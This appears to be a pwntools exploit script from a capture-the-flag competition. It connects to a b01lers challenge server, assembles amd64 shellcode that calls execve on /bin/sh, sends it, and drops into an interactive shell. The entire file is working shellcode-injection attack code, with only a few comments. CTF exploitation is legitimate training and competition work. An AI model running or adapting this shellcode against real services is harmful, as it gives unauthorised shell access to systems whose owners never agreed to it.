#!/usr/bin/python3

from pwn import *

#io = process("./shell")
io = remote("chal.ctf.b01lers.com", 1007)
io.recv()
context.clear(arch="amd64")

#exceve(/bin/sh, ['/bin/sh', NULL], NULL)

shellcode = ""
shellcode += asm("pop rcx") # We pop some address off the stack to get /bin/sh on top of the stack
shellcode += asm("mov rdi, rsp") 
shellcode += asm("xor rdx, rdx") 
shellcode += asm("push rdx") 
shellcode += asm("push rdi") 
shellcode += asm("mov rsi, rsp") 
shellcode += asm("mov al, 59") 
shellcode += asm("syscall") 

io.sendline(shellcode)
io.interactive() # get out shell
